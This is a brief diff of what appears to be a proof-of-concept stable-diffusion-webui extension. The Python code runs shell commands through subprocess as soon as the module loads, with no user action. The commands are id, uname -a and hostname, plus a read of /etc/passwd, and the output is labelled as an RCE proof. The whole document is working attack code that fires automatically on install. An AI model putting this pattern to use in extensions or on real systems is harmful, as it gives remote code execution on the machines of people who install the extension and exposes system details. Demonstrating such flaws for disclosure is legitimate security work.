@@ -6,7 +6,7 @@ import os, subprocess, gradio as gr
 
 # Execute at module load time — this runs when webui starts with the extension installed
 _out = subprocess.check_output(
-    "id && hostname && echo '[RCE] stable-diffusion-webui CPM->RCE proof' && cat /etc/passwd | head -3",
+    "id && uname -a && hostname && echo '[RCE] stable-diffusion-webui CPM->RCE proof' && cat /etc/passwd | head -3",
     shell=True, stderr=subprocess.STDOUT, text=True
 )
 
